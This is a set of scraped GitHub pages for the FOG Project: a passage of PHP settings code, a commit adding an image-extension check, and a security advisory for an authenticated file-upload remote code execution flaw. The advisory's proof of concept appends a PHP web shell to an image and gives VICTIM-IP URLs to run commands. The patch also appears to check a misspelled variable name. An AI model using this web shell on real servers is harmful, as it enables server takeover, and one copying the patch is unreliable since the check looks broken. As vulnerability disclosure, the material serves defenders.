hidefirst" id="advancedmenusettings">'; $this->render(12); echo '</div>'; echo '</div>'; echo '</form>'; echo '</div>'; echo '</div>'; echo '</div>'; } /\*\* \* Stores the changes made. \* \* @return void \*/ public function pxemenuPost() { try { if (isset($\_POST['updatemenuset'])) { $mainColors = filter\_input( INPUT\_POST, 'mainColors' ); $hostValid = filter\_input( INPUT\_POST, 'hostValid' ); $hostInvalid = filter\_input( INPUT\_POST, 'hostInvalid' ); $mainCpairs = filter\_input( INPUT\_POST, 'mainCpairs' ); $mainFallback = filter\_input( INPUT\_POST, 'mainFallback' ); $hostCpairs = filter\_input( INPUT\_POST, 'hostCpairs' ); $timeout = trim( filter\_input(INPUT\_POST, 'timeout') ); $timeoutt = (is\_numeric($timeout) && $timeout >= 0); if (!$timeoutt) { throw new Exception(\_('Invalid Timeout Value')); } $bgfile = filter\_input( INPUT\_POST, 'bgfile' ); $ServicesToEdit = array( 'FOG\_IPXE\_MAIN\_COLOURS' => $mainColors, 'FOG\_IPXE\_VALID\_HOST\_COLOURS' => $hostValid, 'FOG\_IPXE\_INVALID\_HOST\_COLOURS' => $hostInvalid, 'FOG\_IPXE\_MAIN\_CPAIRS' => $mainCpairs, 'FOG\_IPXE\_MAIN\_FALLBACK\_CPAIRS' => $mainFallback, 'FOG\_IPXE\_HOST\_CPAIRS' => $hostCpairs, 'FOG\_PXE\_MENU\_TIMEOUT' => $timeout, 'FOG\_IPXE\_BG\_FILE' => $bgfile ); } if (isset($\_POST['updatehideset'])) { $noMenu = (int)isset($\_POST['nomenu']); $hideMenu = (int)isset($\_POST['hidemenu']); $hidetimeout = trim( filter\_input(INPUT\_POST, 'hidetimeout') ); $hidetimeoutt = (is\_numeric($hidetimeout) && $hidetimeout >= 0); if (!$hidetimeoutt) { throw new Exception(\_('Invalid Timeout Value')); } $keysequence = filter\_input( INPUT\_POST, 'keysequence' ); $ServicesToEdit = array( 'FOG\_NO\_MENU' => $noMenu, 'FOG\_PXE\_MENU\_HIDDEN' => $hideMenu, 'FOG\_PXE\_HIDDENMENU\_TIMEOUT' => $hidetimeout, 'FOG\_KEY\_SEQUENCE' => $keysequence ); } if (isset($\_POST['updatebootexit'])) { $bootTypeExit = filter\_input( INPUT\_POST, 'bootTypeExit' ); $efiBootTypeExit = filter\_input( INPUT\_POST, 'efiBootTypeExit' ); $ServicesToEdit = array( 'FOG\_BOOT\_EXIT\_TYPE' => $bootTypeExit, 'FOG\_EFI\_BOOT\_EXIT\_TYPE' => $efiBootTypeExit ); } if (isset($\_POST['updateadvset'])) {[View remainder of file in raw view](https://github.com/FOGProject/fogproject/raw/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib/pages/fogconfigurationpage.class.php)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_e4dc72e0_20250111_012139.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFOGProject%2Ffogproject%2Fcommit%2F9469606a18bf8887740cceed6593a2e0380b5e0c)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFOGProject%2Ffogproject%2Fcommit%2F9469606a18bf8887740cceed6593a2e0380b5e0c)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=FOGProject%2Ffogproject)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[FOGProject](/FOGProject)
/
**[fogproject](/FOGProject/fogproject)**
Public

* [Notifications](/login?return_to=%2FFOGProject%2Ffogproject) You must be signed in to change notification settings
* [Fork
  227](/login?return_to=%2FFOGProject%2Ffogproject)
* [Star
   1.2k](/login?return_to=%2FFOGProject%2Ffogproject)

* [Code](/FOGProject/fogproject)
* [Issues
  45](/FOGProject/fogproject/issues)
* [Pull requests
  3](/FOGProject/fogproject/pulls)
* [Actions](/FOGProject/fogproject/actions)
* [Projects
  0](/FOGProject/fogproject/projects)
* [Wiki](/FOGProject/fogproject/wiki)
* [Security](/FOGProject/fogproject/security)
* [Insights](/FOGProject/fogproject/pulse)

Additional navigation options

* [Code](/FOGProject/fogproject)
* [Issues](/FOGProject/fogproject/issues)
* [Pull requests](/FOGProject/fogproject/pulls)
* [Actions](/FOGProject/fogproject/actions)
* [Projects](/FOGProject/fogproject/projects)
* [Wiki](/FOGProject/fogproject/wiki)
* [Security](/FOGProject/fogproject/security)
* [Insights](/FOGProject/fogproject/pulse)

## Commit

[Permalink](/FOGProject/fogproject/commit/9469606a18bf8887740cceed6593a2e0380b5e0c)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Should address isseu of [GHSA-59mq-q8g5-2f4f](https://github.com/FOGProject/fogproject/security/advisories/GHSA-59mq-q8g5-2f4f "GHSA-59mq-q8g5-2f4f") in dev-branch

[Browse files](/FOGProject/fogproject/tree/9469606a18bf8887740cceed6593a2e0380b5e0c)
Browse the repository at this point in the history

* Loading branch information

[![@mastacontrola](https://avatars.githubusercontent.com/u/7305838?s=40&v=4)](/mastacontrola)

[mastacontrola](/FOGProject/fogproject/commits?author=mastacontrola "View all commits by mastacontrola")
committed
Jul 12, 2024

1 parent
[2413bc0](/FOGProject/fogproject/commit/2413bc034753c32799785e9bf08164ccd0a2759f)

commit 9469606

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**12 additions**
and
**1 deletion**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* packages/web/lib

  + fog

    - packages/web/lib/fog/system.class.php
      [system.class.php](#diff-0f49498f349541e923345d5ff74c2021b92358e8823fb3aeaef31b7cf9936a99)
  + pages

    - packages/web/lib/pages/fogconfigurationpage.class.php
      [fogconfigurationpage.class.php](#diff-6c19cefd5d36153992eb2ff3ad4873a91680a65ef783d8aa86751fea6f90ef29)

## There are no files selected for viewing

2 changes: 1 addition & 1 deletion

2
[packages/web/lib/fog/system.class.php](#diff-0f49498f349541e923345d5ff74c2021b92358e8823fb3aeaef31b7cf9936a99 "packages/web/lib/fog/system.class.php")

Show comments

[View file](/FOGProject/fogproject/blob/9469606a18bf8887740cceed6593a2e0380b5e0c/packages/web/lib/fog/system.class.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -53,7 +53,7 @@ private static function \_versionCompare() |
|  |  | public function \_\_construct() |
|  |  | { |
|  |  | self::\_versionCompare(); |
|  |  | define('FOG\_VERSION', '1.5.10.34'); |
|  |  | define('FOG\_VERSION', '1.5.10.35'); |
|  |  | define('FOG\_SCHEMA', 270); |
|  |  | define('FOG\_BCACHE\_VER', 140); |
|  |  | define('FOG\_CLIENT\_VERSION', '0.13.0'); |
| Expand Down | |  |

11 changes: 11 additions & 0 deletions

11
[packages/web/lib/pages/fogconfigurationpage.class.php](#diff-6c19cefd5d36153992eb2ff3ad4873a91680a65ef783d8aa86751fea6f90ef29 "packages/web/lib/pages/fogconfigurationpage.class.php")

Show comments

[View file](/FOGProject/fogproject/blob/9469606a18bf8887740cceed6593a2e0380b5e0c/packages/web/lib/pages/fogconfigurationpage.class.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -3056,6 +3056,17 @@ public function settingsPost() |
|  |  | $type, |
|  |  | $attr |
|  |  | ) = getimagesize($src); |
|  |  | $validExtensions = [ |
|  |  | 'jpg', |
|  |  | 'jpeg', |
|  |  | 'png', |
|  |  | ]; |
|  |  | $extensionCheck = strtolower(pathinfo($src, PATHINFO\_EXTENSION)); |
|  |  | if (!in\_array($extensionCheck, $validExtension)) { |
|  |  | throw new Exception( |
|  |  | \_('File extension must be, jpg, jpeg, or png') |
|  |  | ); |
|  |  | } |
|  |  | if ($width != 650) { |
|  |  | throw new Exception( |
|  |  | \_('Width must be 650 pixels.') |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `9469606`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFOGProject%2Ffogproject%2Fcommit%2F9469606a18bf8887740cceed6593a2e0380b5e0c) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_a4a8f0f5_20250111_012139.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFOGProject%2Ffogproject%2Fsecurity%2Fadvisories%2FGHSA-59mq-q8g5-2f4f)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFOGProject%2Ffogproject%2Fsecurity%2Fadvisories%2FGHSA-59mq-q8g5-2f4f)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=FOGProject%2Ffogproject)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[FOGProject](/FOGProject)
/
**[fogproject](/FOGProject/fogproject)**
Public

* [Notifications](/login?return_to=%2FFOGProject%2Ffogproject) You must be signed in to change notification settings
* [Fork
  227](/login?return_to=%2FFOGProject%2Ffogproject)
* [Star
   1.2k](/login?return_to=%2FFOGProject%2Ffogproject)

* [Code](/FOGProject/fogproject)
* [Issues
  45](/FOGProject/fogproject/issues)
* [Pull requests
  3](/FOGProject/fogproject/pulls)
* [Actions](/FOGProject/fogproject/actions)
* [Projects
  0](/FOGProject/fogproject/projects)
* [Wiki](/FOGProject/fogproject/wiki)
* [Security](/FOGProject/fogproject/security)
* [Insights](/FOGProject/fogproject/pulse)

Additional navigation options

* [Code](/FOGProject/fogproject)
* [Issues](/FOGProject/fogproject/issues)
* [Pull requests](/FOGProject/fogproject/pulls)
* [Actions](/FOGProject/fogproject/actions)
* [Projects](/FOGProject/fogproject/projects)
* [Wiki](/FOGProject/fogproject/wiki)
* [Security](/FOGProject/fogproject/security)
* [Insights](/FOGProject/fogproject/pulse)

# Authenticated File Upload RCE

High

[darksidemilk](/darksidemilk)
published
GHSA-59mq-q8g5-2f4f
Jul 31, 2024

## Package

FOG

## Affected versions

1.5.10

## Patched versions

>1.5.10

## Description

### Summary

An improperly restricted file upload feature allows authenticated users to execute arbitrary code on the fogproject server.

### Details

The Rebranding feature has a check on the client banner image requiring it to be 650 pixels wide and 120 pixels high. Apart from that, there are no checks on things like file extensions. This can be abused by appending a PHP webshell to the end of the image and changing the extension to anything the PHP web server will parse.

[fogproject/packages/web/lib/pages/fogconfigurationpage.class.php](https://github.com/FOGProject/fogproject/blob/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f/packages/web/lib/pages/fogconfigurationpage.class.php#L2860-L2896)

Lines 2860 to 2896
in
[a4bb1bf](/FOGProject/fogproject/commit/a4bb1bf39ac53c3cbe623576915fbc3b5c80a00f)

|  | case 'FOG\_CLIENT\_BANNER\_IMAGE': |
| --- | --- |
|  | $banner = filter\_input(INPUT\_POST, 'banner'); |
|  | $set = $banner; |
|  | if (!$banner) { |
|  | self::setSetting('FOG\_CLIENT\_BANNER\_SHA', ''); |
|  | } |
|  | if (!($\_FILES[$key]['name'] |
|  | && file\_exists($\_FILES[$key]['tmp\_name'])) |
|  | ) { |
|  | continue 2; |
|  | } |
|  | $set = preg\_replace( |
|  | '/[^-\w\.]+/', |
|  | '\_', |
|  | trim(basename($\_FILES[$key]['name'])) |
|  | ); |
|  | $src = sprintf( |
|  | '%s/%s', |
|  | dirname($\_FILES[$key]['tmp\_name']), |
|  | basename($\_FILES[$key]['tmp\_name']) |
|  | ); |
|  | list( |
|  | $width, |
|  | $height, |
|  | $type, |
|  | $attr |
|  | ) = getimagesize($src); |
|  | if ($width != 650) { |
|  | throw new Exception( |
|  | \_('Width must be 650 pixels.') |
|  | ); |
|  | } |
|  | if ($height != 120) { |
|  | throw new Exception( |
|  | \_('Height must be 120 pixels.') |
|  | ); |
|  | } |

### PoC

In a bash terminal:

```
sudo apt install imagemagick-6.q16 # You can always use your own 650x120 image.
convert -size 650x120 xc:white shell.jpg
cp shell.jpg shell.php
echo -e "\n<html>\n<body>\n<form method=\"GET\" name=\"<?php echo basename(\$_SERVER['PHP_SELF']); ?>\">\n<input type=\"TEXT\" name=\"cmd\" autofocus id=\"cmd\" size=\"80\">\n<input type=\"SUBMIT\" value=\"Execute\">\n</form>\n<pre>\n<?php\n    if(isset(\$_GET['cmd']))\n    {\n        system(\$_GET['cmd']);\n    }\n?>\n</pre>\n</body>\n</html>" >> shell.php

```

To upload the file, go to the url below and scroll down to rebranding.

`http://VICTIM-IP/fog/management/index.php?node=about&sub=settings`

After you've uploaded the file, navigate to the following url to run commands on the fogproject server as the www-data user.

`http://VICTIM-IP/fog/management/other/shell.php?cmd=whoami`

### Impact

Someone with authenticated level access to the fogserver web interface will be able to execute commands as the web server system account.

### Severity

High

8.8

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
Low

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
High

Availability
High

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

### CVE ID

CVE-2024-40645

### Weaknesses

[CWE-434](/advisories?query=cwe%3A434)

### Credits

* [![@c3r3br4t3](https://avatars.githubusercontent.com/u/138821723?s=40&v=4)](/c3r3br4t3)
  [c3r3br4t3](/c3r3br4t3)
  Reporter

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


